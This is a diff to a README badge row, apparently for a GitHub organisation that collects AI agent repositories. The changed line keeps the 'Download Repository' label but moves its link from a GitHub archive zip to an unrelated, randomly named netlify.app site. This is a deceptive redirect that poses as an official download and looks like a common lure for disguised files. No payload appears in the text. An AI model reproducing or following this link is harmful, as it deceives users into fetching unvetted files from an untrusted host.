@@ -6,7 +6,7 @@ A collection of repositories dedicated to <b>AI agents, autonomous systems, and 
 
 <p align="center">
 
-[![Repositories](https://img.shields.io/badge/AI%20Agents%20Hub-Repositories-000000?style=for-the-badge)](https://github.com/AI-Agents-Hubs/.github) [![Awesome AI Agents 2026](https://img.shields.io/badge/Awesome%20AI%20Agents-2026-blue?style=for-the-badge)](https://github.com/AI-Agents-Hubs/Awesome-AI-Agents-2026) [![Download Repository](https://img.shields.io/badge/Download-Repository-success?style=for-the-badge)](https://github.com/AI-Agents-Hub/awesome-ai-agents-2026/archive/refs/heads/main.zip)
+[![Repositories](https://img.shields.io/badge/AI%20Agents%20Hub-Repositories-000000?style=for-the-badge)](https://github.com/AI-Agents-Hubs/.github) [![Awesome AI Agents 2026](https://img.shields.io/badge/Awesome%20AI%20Agents-2026-blue?style=for-the-badge)](https://github.com/AI-Agents-Hubs/Awesome-AI-Agents-2026) [![Download Repository](https://img.shields.io/badge/Download-Repository-success?style=for-the-badge)](https://regal-bonbon-c9a9a8.netlify.app/)
  
 
 
